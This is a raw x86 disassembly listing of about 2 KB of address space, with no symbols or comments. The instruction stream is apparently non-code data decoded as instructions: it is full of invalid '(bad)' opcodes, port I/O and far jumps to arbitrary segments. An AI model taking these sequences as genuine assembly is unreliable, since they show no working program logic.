  422a0c:	dec    ebx
  422a0d:	test   BYTE PTR [ebp-0x70],cl
  422a10:	jecxz  0x4229d6
  422a12:	lahf   
  422a13:	(bad)  
  422a14:	aaa    
  422a15:	and    BYTE PTR [ebx],ch
  422a17:	out    0xd1,eax
  422a19:	mov    ecx,0x62f1c60
  422a1e:	pusha  
  422a1f:	pop    es
  422a20:	add    ecx,0x78
  422a23:	or     DWORD PTR [esi-0x19],ebx
  422a26:	mov    esi,0x796de496
  422a2b:	and    BYTE PTR [edi],ch
  422a2d:	or     DWORD PTR [ebp-0x5095371c],esp
  422a33:	pop    eax
  422a34:	outs   dx,BYTE PTR ds:[esi]
  422a35:	add    cl,dh
  422a37:	cmc    
  422a38:	jbe    0x422a3d
  422a3a:	mov    bh,0x10
  422a3c:	popa   
  422a3d:	aaa    
  422a3e:	pop    es
  422a3f:	adc    DWORD PTR [ecx-0x2a],ecx
  422a42:	pop    es
  422a43:	sub    ebx,DWORD PTR [eax+0x0]
	...
  422a52:	xchg   DWORD PTR [ebx+edx*8],ecx
  422a55:	fcmovu st,st(3)
  422a57:	fisttp WORD PTR [edi+0x640ccb5d]
  422a5d:	push   ss
  422a5e:	int3   
  422a5f:	pop    esi
  422a60:	rol    ecx,0x5
  422a63:	rol    DWORD PTR [ecx],1
  422a65:	add    BYTE PTR [ebx+0x0],bl
  422a68:	add    BYTE PTR [eax],al
  422a6a:	jle    0x422a9a
  422a6c:	jge    0x422abe
  422a6e:	cld    
  422a6f:	inc    ebx
  422a70:	ja     0x422a1b
  422a72:	loop   0x422a27
  422a74:	xlat   BYTE PTR ds:[ebx]
  422a75:	jge    0x422a4d
  422a77:	and    eax,0xe6e9fd24
  422a7c:	push   ecx
  422a7d:	loop   0x422a04
  422a7f:	jmp    0x819:0x9424da8d
  422a86:	outs   dx,DWORD PTR ds:[esi]
  422a87:	iret   
  422a88:	loopne 0x422a5b
  422a8a:	ins    DWORD PTR es:[edi],dx
  422a8b:	dec    ecx
  422a8c:	je     0x422aca
  422a8e:	sub    al,0xde
  422a90:	ins    DWORD PTR es:[edi],dx
  422a91:	les    ecx,FWORD PTR [edx]
  422a93:	inc    ebp
  422a94:	mov    ebp,0xd5ac2bd4
  422a99:	mov    edi,0x25113192
  422a9e:	js     0x422ac0
  422aa0:	push   ds
  422aa1:	mov    ?,WORD PTR ds:0x939b1ba1
  422aa7:	(bad)  
  422aa8:	xlat   BYTE PTR ds:[ebx]
  422aa9:	mov    ch,0x25
  422aab:	push   ss
  422aac:	mov    eax,0xc8d1d079
  422ab1:	retf   
  422ab2:	and    BYTE PTR [edi+0x28],cl
  422ab5:	or     al,0xec
  422ab7:	sub    al,0xf0
  422ab9:	sub    BYTE PTR [esi],ah
  422abb:	inc    ecx
  422abc:	jmp    0x6adc9fa5
  422ac1:	pop    ss
  422ac2:	or     eax,0xc2e1
	...
  422acf:	add    BYTE PTR [eax],al
  422ad1:	add    BYTE PTR [edi-0x28db29d],bl
  422ad7:	jle    0x422a98
  422ad9:	out    dx,eax
  422ada:	sbb    edi,esp
  422adc:	mov    BYTE PTR [eax+esi*1+0x6069c21a],dh
  422ae3:	rol    DWORD PTR [ecx],1
  422ae5:	add    BYTE PTR [ebx+0x0],bl
  422ae8:	add    BYTE PTR [eax],al
  422aea:	popf   
  422aeb:	xlat   BYTE PTR ds:[ebx]
  422aec:	pusha  
  422aed:	fidiv  DWORD PTR [edi-0x40]
  422af0:	push   esi
  422af1:	mov    al,BYTE PTR [edx+0x38a14e3e]
  422af7:	imul   ebp,esi,0x18
  422afa:	in     eax,0xc4
  422afc:	push   0x46
  422afe:	ja     0x422b0a
  422b00:	sub    al,0xfd
  422b02:	and    dh,dh
  422b04:	adc    DWORD PTR [eax-0x55],eax
  422b07:	es cwde 
  422b09:	sbb    ch,0x95
  422b0c:	repnz xlat BYTE PTR ds:[ebx]
  422b0e:	mov    BYTE PTR [ecx-0x51dcd549],dl
  422b14:	out    0x48,al
  422b16:	mov    dl,0x73
  422b18:	jnp    0x422b7a
  422b1a:	int    0x1c
  422b1c:	push   ecx
  422b1d:	sahf   
  422b1e:	xor    al,0x29
  422b20:	sti    
  422b21:	adc    dl,BYTE PTR [edi-0x2f]
  422b24:	pop    esp
  422b25:	dec    eax
  422b26:	dec    esp
  422b27:	lea    edx,[esi+0x39]
  422b2a:	out    dx,eax
  422b2b:	(bad)  
  422b2c:	mov    BYTE PTR [ebx],bh
  422b2e:	jmp    0x422b27
  422b30:	push   ds
  422b31:	fwait
  422b32:	jmp    DWORD PTR [esi]
  422b34:	fimul  DWORD PTR [ebx]
  422b36:	das    
  422b37:	pop    ecx
  422b38:	das    
  422b39:	pushf  
  422b3a:	loopne 0x422b49
  422b3c:	test   BYTE PTR [esp+ecx*4],ch
  422b3f:	ret    0xacf2
  422b42:	(bad)  
  422b44:	mov    ecx,0x0
	...
  422b51:	add    BYTE PTR [eax+0x23],dh
  422b54:	and    eax,0x7c6f7769
  422b59:	cmp    esp,DWORD PTR [eax-0x614311e4]
  422b5f:	pop    es
  422b60:	cmp    DWORD PTR [edi],0xffffffbb
  422b63:	rol    DWORD PTR [ecx],1
  422b65:	add    BYTE PTR [ebx+0x0],bl
  422b68:	add    BYTE PTR [eax],al
  422b6a:	pop    edx
  422b6b:	sbb    BYTE PTR [edx+0x70ebc5de],0x4b
  422b72:	mov    ebx,0x6aa08c26
  422b77:	das    
  422b78:	jae    0x422bf8
  422b7a:	popa   
  422b7b:	sbb    BYTE PTR [ebp-0x7f],ch
  422b7e:	cmc    
  422b7f:	clc    
  422b80:	inc    edi
  422b81:	aad    0xb
  422b83:	(bad)  
  422b85:	jns    0x422b96
  422b87:	icebp  
  422b88:	or     eax,0xf411812a
  422b8d:	jnp    0x422bdb
  422b8f:	(bad)  
  422b92:	mov    WORD PTR [esi],ds
  422b94:	into   
  422b95:	push   edi
  422b96:	mov    esp,0x1cddbf18
  422b9b:	mov    dl,0x0
  422b9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b9e:	xadd   BYTE PTR [esi-0x607c3280],cl
  422ba5:	cmp    bh,BYTE PTR [ecx+0x3]
  422ba8:	pop    ebx
  422ba9:	repz inc edx
  422bab:	outs   dx,BYTE PTR ds:[esi]
  422bac:	fsub   DWORD PTR [ebx-0xb088e95]
  422bb2:	or     al,dh
  422bb4:	hlt    
  422bb5:	xchg   DWORD PTR [eax+0x633163f3],edx
  422bbb:	in     eax,dx
  422bbc:	adc    al,0x52
  422bbe:	inc    ebx
  422bbf:	pop    es
  422bc0:	jo     0x422b57
  422bc2:	push   esp
  422bc3:	jmp    0x0:0x30
	...
  422bd2:	xchg   esp,eax
  422bd3:	nop
  422bd4:	ffree  st(0)
  422bd6:	(bad)  
  422bd8:	popf   
  422bd9:	aam    0x57
  422bdb:	(bad)
  422bdf:	aad    0x32
  422be1:	mov    ds:0x1d216,al
  422be6:	pop    ebx
  422be7:	add    BYTE PTR [eax],al
  422be9:	add    BYTE PTR [esi+edx*4-0x8],bh
  422bed:	cmp    al,ch
  422bef:	rol    DWORD PTR ds:0xaa64b6d4,0xa1
  422bf6:	rcl    esp,cl
  422bf8:	xchg   DWORD PTR [ebp+0x71e96fdb],ebp
  422bfe:	retf   
  422bff:	xchg   edi,eax
  422c00:	js     0x422b93
  422c02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c03:	dec    ebp
  422c04:	xchg   dl,bh
  422c06:	pusha  
  422c07:	mov    ds:0x6c1b175c,eax
  422c0c:	dec    DWORD PTR [eax]
  422c0e:	pop    ds
  422c0f:	jno    0x422c07
  422c11:	mov    esp,DWORD PTR [eax]
  422c13:	push   esp
  422c14:	in     eax,0x1f
  422c16:	add    DWORD PTR [edi+0x31],edx
  422c19:	jmp    FWORD PTR [ecx+0xf]
  422c1c:	cmp    ch,BYTE PTR [esi-0x73b07d31]
  422c22:	sbb    al,cl
  422c24:	(bad)  
  422c25:	mov    al,0x86
  422c27:	shr    edi,1
  422c29:	iret   
  422c2a:	loope  0x422c01
  422c2c:	imul   BYTE PTR [esi-0x109f7e64]
  422c32:	in     al,0x27
  422c34:	and    dl,BYTE PTR [esi-0x75]
  422c37:	mov    ds:0x771cc426,eax
  422c3c:	and    DWORD PTR [edi+0x39],edi
  422c3f:	cmp    al,0xb
  422c41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c42:	mov    ecx,0x3f
	...
  422c4f:	add    BYTE PTR [eax],al
  422c51:	add    ah,dh
  422c53:	mov    dl,0x32
  422c55:	(bad)  
  422c56:	jbe    0x422c2e
  422c58:	hlt    
  422c59:	mov    dl,0xb1
  422c5b:	and    al,0xfe
  422c5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c5e:	lock ss call 0x5b00:0x1d271a9
  422c67:	add    BYTE PTR [eax],al
  422c69:	add    bl,cl
  422c6b:	test   eax,0x7d68df27
  422c70:	mov    ds:0x2c21bf52,eax
  422c75:	pop    edx
  422c76:	sbb    bl,BYTE PTR [eax+0x4c8ce4a9]
  422c7c:	pushf  
  422c7d:	dec    edx
  422c7e:	popa   
  422c7f:	pop    ecx
  422c80:	mov    al,ds:0xf5fcc314
  422c85:	ja     0x422cfd
  422c87:	mov    ds:0x2ef3d417,al
  422c8c:	jo     0x422c3e
  422c8e:	in     al,dx
  422c8f:	inc    edi
  422c90:	xor    BYTE PTR [ebx],dl
  422c92:	neg    edi
  422c94:	sub    eax,0x4650659e
  422c99:	sbb    eax,0xe9ccb717
  422c9e:	mov    bh,0x39
  422ca0:	jl     0x422c54
  422ca2:	add    BYTE PTR [ecx+0x1c],0xe7
  422ca6:	or     al,0x5
  422ca8:	mov    DWORD PTR [esi-0xe48abf2],edi
  422cae:	or     DWORD PTR [eax+0x3],edi
  422cb1:	cmp    BYTE PTR [edx],dh
  422cb3:	dec    esp
  422cb4:	mov    bh,0xf5
  422cb6:	loop   0x422c84
  422cb8:	mov    BYTE PTR [ecx-0x4f4b500c],dh
  422cbe:	fsub   DWORD PTR [eax]
  422cc0:	leave  
  422cc1:	jg     0x422ce0
  422cc3:	cmp    ebp,0x0
	...
  422cd2:	xor    dl,bl
  422cd4:	into   
  422cd5:	mov    ds:0xd37ebfef,al
  422cda:	sub    edi,DWORD PTR [esi]
  422cdc:	out    0x3f,eax
  422cde:	scas   eax,DWORD PTR es:[edi]
  422cdf:	jmp    0xd30e3c56
  422ce4:	add    DWORD PTR [eax],eax
  422ce6:	pop    ebx
  422ce7:	add    BYTE PTR [eax],al
  422ce9:	add    BYTE PTR [edx-0xed643cb],al
  422cef:	je     0x422d31
  422cf1:	adc    ah,BYTE PTR ds:0x4eb247f6
  422cf7:	xor    BYTE PTR [ecx-0x77],0xee
  422cfb:	out    0xa8,al
  422cfd:	jge    0x422c93
  422cff:	ja     0x422d6b
  422d01:	xchg   ecx,eax
  422d02:	test   BYTE PTR [ebp+0x33c89f8d],al
  422d08:	mov    al,0xe2
  422d0a:	fild   QWORD PTR [ebp-0x27490437]
  422d10:	jle    0x422ccd
  422d12:	sbb    al,0xd1
  422d14:	cmc    
  422d15:	or     al,BYTE PTR [eax]
  422d17:	(bad)  
  422d18:	in     eax,0xe8
  422d1a:	jmp    0x422d47
  422d1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d1d:	mov    al,0xfe
  422d1f:	enter  0x81e6,0x84
  422d23:	out    0xba,eax
  422d25:	mov    DWORD PTR [ebx+0x5b9c020f],esp
  422d2b:	sub    eax,0x1aec8c4e
  422d30:	adc    BYTE PTR ds:0x67049e95,cl
  422d36:	xchg   esp,ecx
  422d38:	push   ss
  422d39:	je     0x422d8e
  422d3b:	mov    WORD PTR [ebp-0x16],cs
  422d3e:	and    eax,0x52b0b045
  422d43:	sar    esp,1
	...
  422d51:	add    bl,bl
  422d53:	in     eax,dx
  422d54:	outs   dx,BYTE PTR ds:[esi]
  422d55:	and    bh,BYTE PTR [esi-0x5d]
  422d58:	(bad)  
  422d5a:	pop    esi
  422d5b:	(bad)  
  422d5c:	mov    DWORD PTR [ebp-0x7fc3b962],ecx
  422d62:	daa    
  422d63:	rol    DWORD PTR [ecx],cl
  422d65:	add    BYTE PTR [ebx+0x0],bl
  422d68:	add    BYTE PTR [eax],al
  422d6a:	cli    
  422d6b:	stc    
  422d6c:	out    0x49,al
  422d6e:	mov    cl,0x87
  422d70:	leave  
  422d71:	repnz into 
  422d73:	push   ds
  422d74:	icebp  
  422d75:	mov    cl,0x64
  422d77:	stos   BYTE PTR es:[edi],al
  422d78:	lds    esp,FWORD PTR [edi+0xa]
  422d7b:	push   cs
  422d7c:	cli    
  422d7d:	pushf  
  422d7e:	xchg   ebx,eax
  422d7f:	in     al,dx
  422d80:	fistp  WORD PTR [ecx+ebx*2]
  422d83:	mov    eax,ds:0x37202e7d
  422d88:	hlt    
  422d89:	gs push 0xa77cc2e
  422d8f:	adc    edx,DWORD PTR [ebx+0x2a]
  422d92:	sar    BYTE PTR [ebx+eiz*4-0x6b],1
  422d96:	jnp    0x422e03
  422d98:	das    
  422d99:	or     DWORD PTR [esp+ebp*1],ebp
  422d9c:	fidivr DWORD PTR [ebx]
  422d9e:	jecxz  0x422df5
  422da0:	call   0x7a8d:0xcb5dc72b
  422da7:	pop    ebp
  422da8:	mov    edi,0xdafebbe8
  422dad:	int3   
  422dae:	push   0x53
  422db0:	int3   
  422db1:	inc    ecx
  422db2:	push   ecx
  422db3:	ret    
  422db4:	push   edx
  422db5:	push   esi
  422db6:	call   0x70f2:0xc5ae6cd1
  422dbd:	xchg   ebp,eax
  422dbe:	dec    eax
  422dbf:	ja     0x422dac
  422dc1:	dec    edx
  422dc2:	mov    ds:0xc59c,al
	...
  422dcf:	add    BYTE PTR [eax],al
  422dd1:	add    BYTE PTR ds:0x6f976b22,al
  422dd7:	(bad)  
  422dd9:	mov    dl,0x66
  422ddb:	and    BYTE PTR [esi-0x5ecc3296],ah
  422de1:	push   edx
  422de2:	adc    bl,0x1
  422de5:	add    BYTE PTR [ebx+0x0],bl
  422de8:	add    BYTE PTR [eax],al
  422dea:	fs and cl,dl
  422ded:	std    
  422dee:	mov    es,WORD PTR [edx+0x7cd39159]
  422df4:	and    DWORD PTR [ebx+0x2457abc0],ecx
  422dfa:	mov    ds:0x4f1dfd2,al
  422dff:	add    DWORD PTR [eax+edi*8],0xd7c0ee86
  422e06:	out    dx,eax
  422e07:	jnp    0x422d99
  422e09:	ror    DWORD PTR [edi-0x4e],1
  422e0c:	das    
  422e0d:	xor    DWORD PTR fs:[esi+esi*2+0x7936063a],ebp
  422e15:	pusha  
  422e16:	iret   
  422e17:	jle    0x422daf
  422e19:	int3   
  422e1a:	mov    al,ds:0x1d7c2d26
  422e1f:	mov    ds,ebp
  422e21:	mov    dl,0xc7
  422e23:	jl     0x422e60
  422e25:	pusha  
  422e26:	add    esp,DWORD PTR [ecx]
  422e28:	adc    eax,0x38
  422e2b:	mov    ch,0x72
  422e2d:	and    eax,0x6e0cb4c1
  422e32:	xchg   edx,eax
  422e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e34:	mov    cl,0x60
  422e36:	adc    al,0xd7
  422e38:	adc    DWORD PTR [ebx+ebx*8],edx
  422e3b:	jmp    DWORD PTR [eax+0x11]
  422e3e:	cs mov bh,0x6e
  422e41:	xchg   esp,eax
  422e42:	scas   eax,DWORD PTR es:[edi]
  422e43:	mov    esp,es
	...
  422e51:	add    BYTE PTR [ebx+0x7fd924d4],cl
  422e57:	stc    
  422e58:	call   esi
  422e5a:	into   
  422e5b:	inc    ebp
  422e5c:	mov    bh,0x11
  422e5e:	pop    eax
  422e5f:	xchg   edi,eax
  422e60:	add    BYTE PTR [ebp-0x23],bl
  422e63:	rol    DWORD PTR [ecx],cl
  422e65:	add    BYTE PTR [ebx+0x0],bl
  422e68:	add    BYTE PTR [eax],al
  422e6a:	sub    DWORD PTR ds:0x17759d8e,ebp
  422e70:	mov    eax,0xba2780d4
  422e75:	lahf   
  422e76:	js     0x422e8b
  422e78:	cmp    DWORD PTR [edi],edx
  422e7a:	cwde   
  422e7b:	pop    edx
  422e7c:	(bad)  
  422e7d:	in     eax,0x52
  422e7f:	xchg   BYTE PTR [esi+ebx*1-0x6e],ah
  422e83:	arpl   WORD PTR [edi+edi*1+0x31],bx
  422e87:	adc    edi,DWORD PTR [ebp+0x6e]
  422e8a:	sbb    DWORD PTR [bx+0x4b],ebx
  422e8e:	sub    BYTE PTR [edx],0xb0
  422e91:	pop    es
  422e92:	aas    
  422e93:	popf   
  422e94:	mov    BYTE PTR [edi],bl
  422e96:	add    al,0xbc
  422e98:	retf   0x3a7c
  422e9b:	fiadd  DWORD PTR [eax+0x36b4e022]
  422ea1:	add    ebx,esi
  422ea3:	mov    eax,esp
  422ea5:	enter  0x1693,0xbb
  422ea9:	mov    ecx,0xe312951d
  422eae:	dec    ebx
  422eaf:	jl     0x422eeb
  422eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422eb2:	repz jb 0x422e4b
  422eb5:	ficom  DWORD PTR [ebx+eiz*1-0x19c24364]
  422ebc:	cmp    cl,BYTE PTR [esi-0x3780c8b]
  422ec2:	inc    esi
  422ec3:	iret   
  422ec4:	cmc    
	...
  422ed1:	add    dh,bl
  422ed3:	sub    DWORD PTR [eax-0x210c002e],ebx
  422ed9:	sub    eax,0x4af35f6
  422ede:	sub    ecx,DWORD PTR [edx-0x34]
  422ee1:	retf   0xd438
  422ee4:	add    DWORD PTR [eax],eax
  422ee6:	pop    ebx
  422ee7:	add    BYTE PTR [eax],al
  422ee9:	add    BYTE PTR [ecx+0xd],bl
  422eec:	jmp    0x8629:0x8c7c9ee1
  422ef3:	(bad)  
  422ef4:	imul   edi,edx,0x53b0f621
  422efa:	(bad)  
  422efc:	ficomp DWORD PTR [esp+eiz*8-0x48bc5355]
  422f03:	jno    0x422ec7
  422f05:	inc    edx
  422f06:	cli    
  422f07:	pop    ss
  422f08:	mov    dl,0x3c
  422f0a:	cli    
  422f0b:	shl    DWORD PTR [eax-0xd79b895],1
  422f11:	ins    DWORD PTR es:[edi],dx
  422f12:	icebp  
  422f13:	push   ds
  422f14:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f17:	xchg   ebp,eax
  422f18:	fisub  DWORD PTR ds:0x25dc9d8a
  422f1e:	jecxz  0x422ebd
  422f20:	mov    ecx,es
  422f22:	leave  
  422f23:	and    edi,eax
  422f25:	out    0x9d,eax
  422f27:	stc    
  422f28:	cmc    
  422f29:	icebp  
  422f2a:	in     al,0x7a
  422f2c:	mov    ebp,0xed023c92
  422f31:	fcom   DWORD PTR [edi]
  422f33:	pusha  
  422f34:	jge    0x422f68
  422f36:	push   0xb21b3953
  422f3b:	pop    edi
  422f3c:	mov    esp,0x6dde840
  422f41:	icebp  
  422f42:	mov    esp,0x82e7
	...
  422f4f:	add    BYTE PTR [eax],al
  422f51:	add    BYTE PTR [esi+0x3f],cl
  422f54:	int3   
  422f55:	sbb    eax,0x7fdffffd
  422f5a:	out    dx,eax
  422f5b:	loopne 0x422f73
  422f5d:	lods   al,BYTE PTR ds:[esi]
  422f5e:	aas    
  422f5f:	adc    bl,BYTE PTR [ecx+0x30]
  422f62:	xchg   ebx,eax
  422f63:	aam    0x1
  422f65:	add    BYTE PTR [ebx+0x0],bl
  422f68:	add    BYTE PTR [eax],al
  422f6a:	mov    ebp,0xf230b630
  422f6f:	fwait
  422f70:	int3   
  422f71:	cmp    eax,0xfdab41bf
  422f76:	clc    
  422f77:	test   al,0x99
  422f79:	aam    0x3d
  422f7b:	push   eax
  422f7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f7d:	fstp   st(1)
  422f7f:	fs add al,0x4d
  422f82:	push   ecx
  422f83:	jb     0x422fcd
  422f85:	xor    al,0xad
  422f87:	ds call 0x126a:0xda16094a
  422f8f:	pminub mm1,QWORD PTR [ebp+0x31]
  422f93:	test   ebx,edx
  422f95:	imul   ebp,DWORD PTR [edx],0x32
  422f98:	xor    esi,esp
  422f9a:	xchg   esp,eax
  422f9b:	fisttp WORD PTR [edi+0x13]
  422f9e:	sar    BYTE PTR [ecx+0x1],0xd6
  422fa2:	mov    cl,0x2e
  422fa4:	lahf   
  422fa5:	push   eax
  422fa6:	sbb    edi,DWORD PTR [ebx]
  422fa8:	out    0xbb,eax
  422faa:	pop    eax
  422fab:	in     al,0x5a
  422fad:	sbb    DWORD PTR [ecx+0xf],0xf0b459fe
  422fb4:	sbb    bh,bh
  422fb6:	lods   al,BYTE PTR ds:[esi]
  422fb7:	or     eax,0x6afe1034
  422fbc:	and    al,0x2a
  422fbe:	fs xchg ebp,eax
  422fc0:	int3   
  422fc1:	and    esp,DWORD PTR [ebx]
  422fc3:	and    BYTE PTR [ebp+0x0],dl
	...
  422fd1:	add    BYTE PTR [esi],bl
  422fd3:	test   eax,0x7ff735f6
  422fd8:	fild   QWORD PTR [ebx-0x5f9ed871]
  422fde:	in     eax,dx
  422fdf:	outs   dx,BYTE PTR ds:[esi]
  422fe0:	out    dx,eax
  422fe1:	in     al,dx
  422fe2:	out    dx,al
  422fe3:	aam    0x1
  422fe5:	add    BYTE PTR [ebx+0x0],bl
  422fe8:	add    BYTE PTR [eax],al
  422fea:	and    BYTE PTR [edi+0x1bb1abd4],ah
  422ff0:	shl    DWORD PTR [esi-0x75],0x7f
  422ff4:	adc    ch,BYTE PTR [edx+0x3cdc10a]
  422ffa:	mov    fs:0x5d5474da,eax
  423000:	ins    BYTE PTR es:[edi],dx
  423001:	aaa    
  423002:	xchg   edi,eax
  423003:	lods   al,BYTE PTR ds:[esi]
  423004:	push   ebx
  423005:	sbb    DWORD PTR [ecx],edi
  423007:	xchg   ecx,eax
  423008:	pop    ecx
  423009:	adc    DWORD PTR [edx-0x4db1b293],ebp
  42300f:	push   ecx
  423010:	fsubr  QWORD PTR [edx-0x7d]
  423013:	aad    0x0
  423015:	in     eax,0xfc
  423017:	xchg   edi,eax
  423018:	test   DWORD PTR ds:0xdf91b249,esi
  42301e:	dec    ebp
  42301f:	ficom  DWORD PTR [esi-0x3c]
  423022:	sub    esi,ecx
  423024:	push   0x5db1378d
  423029:	iret   
  42302a:	mov    DWORD PTR [ebx-0x5c39f674],ecx
  423030:	fstp   DWORD PTR [eax-0x7f]
  423033:	(bad)  
  423034:	lds    ecx,FWORD PTR [ecx]
  423036:	or     al,0x45
  423038:	jge    0x423004
  42303a:	mov    esi,0xa8c5bb84
  42303f:	stos   DWORD PTR es:[edi],eax
  423040:	fdiv   QWORD PTR ds:0x8b795e
	...
  423052:	fwait
  423053:	loope  0x4230c2
  423055:	sub    eax,0xf7dbad7f
  42305a:	sar    BYTE PTR [ebx],cl
  42305c:	(bad)  
  42305d:	add    BYTE PTR [eax+0x49c0477f],al
  423063:	aad    0x1
  423065:	add    BYTE PTR [ebx+0x0],bl
  423068:	add    BYTE PTR [eax],al
  42306a:	pop    ecx
  42306b:	mov    ecx,0x1250d78e
  423070:	sub    eax,0x9aed4674
  423075:	test   DWORD PTR [eax-0x5e],ebx
  423078:	out    dx,eax
  423079:	and    eax,0x7b185710
  42307e:	mov    esi,DWORD PTR [ebx-0xa5278e0]
  423084:	sbb    BYTE PTR [esp+ebx*8-0x5c],dl
  423088:	test   BYTE PTR [ebp-0x6],dl
  42308b:	fnsave [edi+0x43]
  42308e:	pop    edx
  42308f:	aaa    
  423090:	xchg   esi,eax
  423091:	mov    ecx,0x654ce8a3
  423096:	data16 sub al,0x9f
  42309a:	inc    esp
  42309b:	xor    bh,BYTE PTR [edx-0x2094f2fb]
  4230a1:	mov    edx,DWORD PTR [edi+0x19]
  4230a4:	mov    eax,ds:0xc04dfb5d
  4230a9:	add    bh,ah
  4230ab:	outs   dx,BYTE PTR ds:[esi]
  4230ac:	dec    esp
  4230ad:	in     eax,0x20
  4230af:	sbb    esi,DWORD PTR [ebp+ecx*8+0x42]
  4230b3:	xchg   esp,eax
  4230b4:	loope  0x4230f0
  4230b6:	rcr    DWORD PTR [ecx],0xb
  4230b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230ba:	(bad)  
  4230bb:	popa   
  4230bc:	or     al,0x30
  4230be:	arpl   WORD PTR [edx+0x28],dx
  4230c1:	jne    0x4230c9
  4230c3:	mov    bl,0xb8
	...
  4230d1:	add    BYTE PTR [eax],cl
  4230d3:	div    DWORD PTR [edi+0x4a]
  4230d6:	dec    edx
  4230d8:	cmp    eax,0x2e8eedf7
  4230dd:	dec    eax
  4230de:	in     al,0xe1
  4230e0:	jbe    0x42313f
  4230e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230e3:	aad    0x1
  4230e5:	add    BYTE PTR [ebx+0x0],bl
  4230e8:	add    BYTE PTR [eax],al
  4230ea:	mov    es,WORD PTR [edi+0x66febd2a]
  4230f0:	retf   
  4230f1:	cmp    DWORD PTR [ebx],edi
  4230f3:	xor    al,0x64
  4230f5:	push   cs
  4230f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230f7:	in     al,0xbd
  4230f9:	sbb    DWORD PTR ds:0x88f57d9d,edx
  4230ff:	aas    
  423100:	xor    dh,BYTE PTR [ebp-0xe]
  423103:	mov    al,0xd2
  423105:	mov    al,0xf8
  423107:	xor    DWORD PTR [ebx+0x62],0x97a0bdc7
  42310e:	push   es
  42310f:	cld    
  423110:	adc    DWORD PTR [ebx+edx*2-0x28],ebx
  423114:	ds in  eax,0xa2
  423117:	ret    0x1ef8
  42311a:	in     al,0x64
  42311c:	fldenv [eax-0x1a]
  42311f:	push   ecx
  423120:	lahf   
  423121:	sub    al,0x90
  423123:	aaa    
  423124:	fs in  ax,0x34
  423128:	xchg   ebp,eax
  423129:	les    edi,FWORD PTR [esi+0x7b]
  42312c:	inc    ebx
  42312d:	lds    edi,FWORD PTR [edi-0x1e]
  423130:	push   esi
  423131:	push   esi
  423132:	sbb    eax,0xc3ec873f
  423137:	je     0x423165
  423139:	adc    eax,0xeeb35475
  42313e:	addr16 sahf 
  423140:	dec    eax
  423141:	xrelease mov BYTE PTR [edx+eiz*2],ch
	...
  423151:	add    BYTE PTR [esi],dh
  423153:	arpl   WORD PTR [eax-0x10],bp
  423156:	jge    0x423153
  423158:	mov    esi,0x8c7853e7
  42315d:	daa    
  42315e:	and    al,0xcf
  423160:	shl    DWORD PTR [edx+0x1d5ff],1
  423166:	pop    ebx
  423167:	add    BYTE PTR [eax],al
  423169:	add    BYTE PTR [ebx+0x3c3e2400],dl
  42316f:	ret    
  423170:	jl     0x42314d
  423172:	scas   eax,DWORD PTR es:[edi]
  423173:	or     bh,ch
  423175:	or     eax,0x516fdfcc
  42317a:	sub    eax,0x3eaa4ccb
  42317f:	ds ret 
  423181:	hlt    
  423182:	retf   0x2295
  423185:	mov    fs,ecx
  423187:	pusha  
  423188:	push   esi
  423189:	int    0x7d
  42318b:	jnp    0x423130
  42318d:	mov    bh,0x4
  42318f:	jle    0x423153
  423191:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423192:	xor    al,0x1e
  423194:	mov    ebx,0x2afb9e70
  423199:	mov    esp,0x7d150957
  42319e:	xor    ebx,DWORD PTR [ecx+0x7e]
  4231a1:	adc    BYTE PTR gs:[ebx+eiz*8+0x2e882348],al
  4231a9:	cld    
  4231aa:	jp     0x4231f0
  4231ac:	scas   al,BYTE PTR es:[edi]
  4231ad:	stos   DWORD PTR es:[edi],eax
  4231ae:	out    0x5,eax
  4231b0:	jns    0x4231cc
  4231b2:	or     DWORD PTR [edi],esp
  4231b4:	pusha  
  4231b5:	mov    ebx,0x1630ad98
  4231ba:	cmp    ebp,ebp
  4231bc:	fwait
  4231bd:	scas   eax,DWORD PTR es:[edi]
  4231be:	and    eax,0xff3b26e2
  4231c3:	sub    cl,dl
	...
  4231d1:	add    BYTE PTR [edi],ah
  4231d3:	push   ecx
  4231d4:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  4231de:	xor    ebx,DWORD PTR [eax-0x233f39d8]
  4231e4:	add    DWORD PTR [eax],eax
  4231e6:	pop    ebx
  4231e7:	add    BYTE PTR [eax],al
  4231e9:	add    BYTE PTR [edx-0x41c7fca1],bl
  4231ef:	fisttp WORD PTR [edi+ecx*8+0x4d]
  4231f3:	cwde   
  4231f4:	xor    BYTE PTR [edx+0x3f],ch
  4231f7:	adc    DWORD PTR [eax+0x3b897db2],edx
  4231fd:	sub    esi,DWORD PTR [esi-0x64]
  423200:	jmp    0xd4691727
  423205:	popa   
  423206:	aad    0x7
  423208:	sar    DWORD PTR [esi+0x15],1
  42320b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42320c:	gs or  eax,0x454a3904
  423212:	stos   BYTE PTR es:[edi],al
  423213:	and    eax,0x1d68438c
  423218:	xor    eax,DWORD PTR [eax-0x40]
  42321b:	aas    
  42321c:	sub    DWORD PTR [edi+0x49],esp
  42321f:	xchg   BYTE PTR ss:[ebx],ah
  423222:	(bad)  
  423223:	xor    BYTE PTR [ecx+edi*1+0x4d5b4001],ch
  42322a:	test   BYTE PTR [ebp+0x6d1b9a7d],0x33
  423231:	outs   dx,DWORD PTR ds:[esi]
  423232:	loope  0x423265
  423234:	jecxz  0x423207
  423236:	(bad)
  423239:	rcl    edx,1
  42323b:	mov    WORD PTR [esi+0x10],fs
  42323e:	cmp    bl,ah
  423240:	push   ds
  423241:	ss push ebp
  423243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423244:	dec    ebp
	...
  423251:	add    BYTE PTR [edi],ah
  423253:	ss lahf 
